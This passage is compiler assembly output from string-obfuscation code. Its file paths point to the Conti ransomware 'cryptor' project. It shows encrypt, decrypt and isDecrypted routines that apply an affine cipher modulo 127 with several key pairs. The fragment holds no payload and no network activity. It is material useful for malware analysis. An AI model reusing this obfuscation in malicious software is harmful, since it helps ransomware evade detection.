?isDecrypted@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 53 00 00 00	 mov	 ecx, 83			; 00000053H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 0b	 imul	 r8d, ecx, 11

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 17	 imul	 r8d, eax, 23
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 53	 add	 r8d, 83			; 00000053H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0FD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,83,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 3c	 sub	 eax, 60			; 0000003cH
  00006	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00012	41 f7 e8	 imul	 r8d
  00015	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001a	41 03 d0	 add	 edx, r8d
  0001d	c1 fa 06	 sar	 edx, 6
  00020	8b ca		 mov	 ecx, edx
  00022	c1 e9 1f	 shr	 ecx, 31
  00025	03 d1		 add	 edx, ecx
  00027	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002a	44 2b c1	 sub	 r8d, ecx
  0002d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00031	41 f7 e8	 imul	 r8d
  00034	41 03 d0	 add	 edx, r8d
  00037	c1 fa 06	 sar	 edx, 6
  0003a	8b ca		 mov	 ecx, edx
  0003c	c1 e9 1f	 shr	 ecx, 31
  0003f	03 d1		 add	 edx, ecx
  00041	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00044	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00047	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004b	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 59	 imul	 r8d, eax, 89		; 00000059H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 3c	 add	 r8d, 60			; 0000003cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6b	 sub	 eax, 107		; 0000006bH
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6b	 add	 r8d, 107		; 0000006bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0GL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,107,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
